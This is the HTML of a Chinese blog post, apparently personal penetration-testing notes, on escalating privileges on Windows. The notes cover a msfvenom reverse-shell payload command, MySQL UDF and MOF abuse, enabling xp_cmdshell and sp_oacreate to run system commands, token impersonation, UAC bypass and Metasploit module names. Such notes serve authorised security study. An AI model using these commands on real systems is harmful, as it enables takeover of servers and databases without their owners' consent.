@@ -1,0 +1,390 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/favicon/apple-touch-icon.png?v=2.8.0" sizes="180x180"><meta name="description" content="溢出提权       收集信息 1234567whoamiwhoami &#x2F;priv 查看当前用户可执行的事情net usernet localgroupversysteminfotasklist &#x2F;svc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权">
+<meta property="og:url" content="https://www.ixxzhi.cn/2023/08/20/Windows%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="冰糖の部落阁">
+<meta property="og:description" content="溢出提权       收集信息 1234567whoamiwhoami &#x2F;priv 查看当前用户可执行的事情net usernet localgroupversysteminfotasklist &#x2F;svc">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-19T16:05:24.000Z">
+<meta property="article:modified_time" content="2023-09-19T02:33:50.282Z">
+<meta property="article:author" content="冰糖小混子">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary"><title>Windows提权 | 冰糖の部落阁</title><link ref="canonical" href="https://www.ixxzhi.cn/2023/08/20/Windows%E6%8F%90%E6%9D%83/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: {"appId":"AKOK4JB6FU","apiKey":"afe2853f80920ee4cdb1d45209c0ecf2","indexName":"blog_ixxzhi","hits":{"per_page":10},"languages":{"inputPlaceholder":"搜索文章","hitsEmpty":"没有找到任何搜索结果：${query}","hitsStats":"找到 ${hits} 条搜索结果，耗时 ${time} 毫秒"}},
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">冰糖の部落阁</div><div class="header-banner-info__subtitle">冰糖的笔记和随笔</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Windows提权</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-09-19</span></span></div></header><div class="post-body">
+        <h1 id="溢出提权"   >
+          <a href="#溢出提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#溢出提权" class="headerlink" title="溢出提权"></a>溢出提权</h1>
+      <p>收集信息</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">whoami /priv 查看当前用户可执行的事情</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">ver</span><br><span class="line">systeminfo</span><br><span class="line">tasklist /svc</span><br></pre></td></tr></table></div></figure>
+
+<span id="more"></span>
+
+
+        <h1 id="web权限提权"   >
+          <a href="#web权限提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#web权限提权" class="headerlink" title="web权限提权"></a>web权限提权</h1>
+      <ul>
+<li><p>手动检测提权漏洞</p>
+<ol>
+<li><p>使用工具查找可提权的漏洞</p>
+<p>一些大码自带功能</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan" >https://github.com/chroblert/WindowsVulnScan</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+<li><p>使用网上的项目查找可提权的漏洞</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan" >https://i.hacking8.com/tiquan</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+<li><p>可用exp下载</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub" >https://github.com/Ascotbe/Kernelhub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernal-exploits" >https://github.com/SecWiki/windows-kernal-exploits</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+</ol>
+</li>
+<li><p>工具提权</p>
+<ol>
+<li><p>msf提权</p>
+<blockquote>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;2333 -f exe &gt; bt.exe</p>
+</blockquote>
+<p>post&#x2F;windows&#x2F;gather&#x2F;enum_patches 找出系统中的补丁</p>
+<p>post&#x2F;nulti&#x2F;recon&#x2F;local_exploit_suggester 识别系统中可能被利用的漏洞</p>
+<p>set showdescription true 显示详细信息</p>
+</li>
+<li><p>CS提权</p>
+<p>基本命令：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">后台启动 nohub ./teamserver ip 密码 &amp;</span><br><span class="line">修改默认端口： 50055 teamserver文件</span><br></pre></td></tr></table></div></figure></li>
+</ol>
+</li>
+</ul>
+
+        <h1 id="本地提权"   >
+          <a href="#本地提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h1>
+      <blockquote>
+<p>查找步骤和前面一样</p>
+</blockquote>
+<p>登录本地用户</p>
+<p>执行提权的CVE：例如CVE-2020-0780</p>
+<p>本地执行CVE-2020-0780.exe，新弹出个高权限的命令窗口</p>
+
+        <h1 id="数据库提权"   >
+          <a href="#数据库提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1>
+      <p>一般网站都会搭建数据库，所以可以用数据库进行提权</p>
+
+        <h2 id="mysql提权"   >
+          <a href="#mysql提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2>
+      <p>前提：知道数据库密码</p>
+<p>通过sql注入，爆破，任意文件读取等获取密码</p>
+<p>UDF提权</p>
+<p>mysql的聂志函数虽然丰富，但毕竟不能完全满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候就需要对MySQL进行一些扩展，MySQL给使用者提供了添加新函数的机制，这种使用者自行添加的MySQL函数就称为UDF。</p>
+<p>提权原理</p>
+<p>通过定义自定义函数，通过添加新函数，执行系统命令。比如通过引入udf.dll，引入自动以函数(sys_eval函数)，执行系统命令。</p>
+
+        <h3 id="MSF提权"   >
+          <a href="#MSF提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h3>
+      <p>高版本：</p>
+<p>MySQL需要添加：secure-file-priv&#x3D;””</p>
+<p>MySQL版本 &gt; 5.1,udf.dll文件必须放置在MySQL安装目录的lib\plugin文件夹下才可以创建自定义函数。</p>
+<p>MySQL版本&lt;5.1，win 2000操作系统需要导出udf.dll到c:\winnt\目录下</p>
+<p>win 2003操作系统导出udf.dll到c:\windows\目录下。在MySQL5.1版本及以后的环境下，udf提权时需要将udf.dll导出到mysql安装目录\lib\plugin目录下。</p>
+<p>条件：</p>
+<p>已拥有MySQL某个用户账号</p>
+<p>知道MySQL版本、安装路径、端口是否开放(select @@basedir select version())</p>
+<p>开启外联语句</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;Admin@123&#x27;</span> <span class="keyword">with</span> gran</span><br><span class="line">t option;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></div></figure>
+
+<p>提权</p>
+<blockquote>
+<p>手动提权</p>
+</blockquote>
+<ol>
+<li><p>创建文件夹: &#x2F;lib&#x2F;plugin</p>
+</li>
+<li><p>导入abc.dll创建sys_eval()函数</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;abc.dll&#x27;</span>;</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>使用sys_eval()函数</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;net user&#x27;</span>);</span><br></pre></td></tr></table></div></figure></li>
+</ol>
+<blockquote>
+<p>使用MSF模块</p>
+</blockquote>
+<ol>
+<li><p>exploit&#x2F;nulti&#x2F;mysql&#x2F;mysql_udf_payload</p>
+</li>
+<li><p>再使用工具连接数据库，执行</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">return</span> string soname <span class="string">&#x27;WGqASYxX.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></div></figure></li>
+</ol>
+
+        <h3 id="MOF提权"   >
+          <a href="#MOF提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3>
+      <p>利用了C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录下的nullevt&#x2F;mof文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\wbem\MOF目录下。</p>
+<p>失败原因：关键目录写不进去，需要等待被动去执行。</p>
+<p>msf模块</p>
+<p>exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof</p>
+
+        <h3 id="启动项提权"   >
+          <a href="#启动项提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3>
+      <p>​	基于MySQL特性的安全问题，导入自定义的可执行文件到启动目录下，重启后加载可执行文件。</p>
+<p>​	需要开启数据库外联、</p>
+<p>MSF模块：</p>
+<p>exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up</p>
+
+        <h2 id="sql-server-提权"   >
+          <a href="#sql-server-提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#sql-server-提权" class="headerlink" title="sql_server 提权"></a>sql_server 提权</h2>
+      <p>使用：xp_cmdshell、sq_oacreate提权</p>
+
+        <h3 id="xp-cmdshell提权"   >
+          <a href="#xp-cmdshell提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h3>
+      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥</span><br><span class="line">有管理员sa权限则可以用sp_configure重新开启它。</span><br><span class="line">启用：</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span></span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">关闭：</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">reconfigure;</span><br><span class="line">执行：</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;命令&#x27;</span></span><br><span class="line">如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</span><br><span class="line"><span class="keyword">exec</span> master.sys.sp_addextendedproc <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="string">&#x27;C:\Program Files\Micros</span></span><br><span class="line"><span class="string">oft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="sp-oacreate提权"   >
+          <a href="#sp-oacreate提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h3>
+      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE;</span><br><span class="line">关闭：</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE;</span><br><span class="line">执行：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_</span><br><span class="line">oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.t</span></span><br><span class="line"><span class="string">xt&#x27;</span></span><br><span class="line">以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking <span class="keyword">and</span> Embedd</span><br><span class="line">ing的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="令牌窃取"   >
+          <a href="#令牌窃取" class="heading-link"><i class="fas fa-link"></i></a><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h1>
+      <p>令牌(token)是系统的临时密钥，相当于账号和密码、用来决定是否允许这次请求和判断这次请求是属于哪个用户的。它允许你在不提供账号密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非重新启动。</p>
+
+        <h2 id="令牌类型"   >
+          <a href="#令牌类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#令牌类型" class="headerlink" title="令牌类型"></a>令牌类型</h2>
+      <ul>
+<li>授权令牌：交互式会话登录</li>
+<li>模拟令牌：非交互式登录</li>
+<li>两种token只有在系统重启后才会清除，授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。</li>
+<li>默认只能列举当前用户和比当前用户权限更低用户的令牌，但当前的shell是administrator或system时就可以看到系统中的所有令牌</li>
+</ul>
+
+        <h2 id="msf模块"   >
+          <a href="#msf模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#msf模块" class="headerlink" title="msf模块"></a>msf模块</h2>
+      <ol>
+<li>接收到一个反弹会话</li>
+<li>利用incognito.exe工具 use incognito</li>
+<li>查看令牌 list_tokens -u</li>
+<li>窃取令牌： impersonate_token “NT AUTHORITY\SYSTEM”</li>
+</ol>
+
+        <h1 id="Bypass-UAC绕过"   >
+          <a href="#Bypass-UAC绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#Bypass-UAC绕过" class="headerlink" title="Bypass UAC绕过"></a>Bypass UAC绕过</h1>
+      <p>​	操作系统默认情况下是启用UAC，当用户运行软件就会触发UAC规则。执行的时候就需要权限，否则是不会运行的</p>
+<p>MFS模块</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p>
+
+        <h1 id="其他提权方式"   >
+          <a href="#其他提权方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他提权方式" class="headerlink" title="其他提权方式"></a>其他提权方式</h1>
+      
+        <h2 id="psexec提权"   >
+          <a href="#psexec提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#psexec提权" class="headerlink" title="psexec提权"></a>psexec提权</h2>
+      <p>PsExec属于SysinternalSuite(一个windows的内核的套件)，其中一个工具。</p>
+<p>psexec这个工具可以以System账号执行一个程序</p>
+<p>适用于本地提权</p>
+<figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec <span class="literal">-i</span> <span class="literal">-s</span> cmd</span><br><span class="line">	<span class="literal">-i</span> 使用交互模式运行程序</span><br><span class="line">	<span class="literal">-s</span> 使用System账号来运行</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="进程注入，迁移"   >
+          <a href="#进程注入，迁移" class="heading-link"><i class="fas fa-link"></i></a><a href="#进程注入，迁移" class="headerlink" title="进程注入，迁移"></a>进程注入，迁移</h2>
+      <p>MSF模块</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://www.ixxzhi.cn">冰糖小混子</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://www.ixxzhi.cn/2023/08/20/Windows%E6%8F%90%E6%9D%83/">https://www.ixxzhi.cn/2023/08/20/Windows%E6%8F%90%E6%9D%83/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://www.ixxzhi.cn/tags/%E6%8F%90%E6%9D%83/">提权</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/20/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">常见中间件框架漏洞</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/08/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">PHP反序列化漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="utterances-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">
+          溢出提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">
+          web权限提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">
+          本地提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">
+          数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.</span> <span class="toc-text">
+          mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.1.</span> <span class="toc-text">
+          MSF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.2.</span> <span class="toc-text">
+          MOF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.3.</span> <span class="toc-text">
+          启动项提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-server-%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text">
+          sql_server 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.1.</span> <span class="toc-text">
+          xp_cmdshell提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-oacreate%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.2.</span> <span class="toc-text">
+          sp_oacreate提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">5.</span> <span class="toc-text">
+          令牌窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.1.</span> <span class="toc-text">
+          令牌类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%A8%A1%E5%9D%97"><span class="toc-number">5.2.</span> <span class="toc-text">
+          msf模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-UAC%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">
+          Bypass UAC绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">7.</span> <span class="toc-text">
+          其他提权方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec%E6%8F%90%E6%9D%83"><span class="toc-number">7.1.</span> <span class="toc-text">
+          psexec提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%EF%BC%8C%E8%BF%81%E7%A7%BB"><span class="toc-number">7.2.</span> <span class="toc-text">
+          进程注入，迁移</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/avatar.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">冰糖小混子</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">31</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">23</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>冰糖小混子</span><span class="footer__devider">|</span><span><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">蒙ICP备20002846号</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"></div><div class="search-results"><div id="algolia-hits"></div></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script 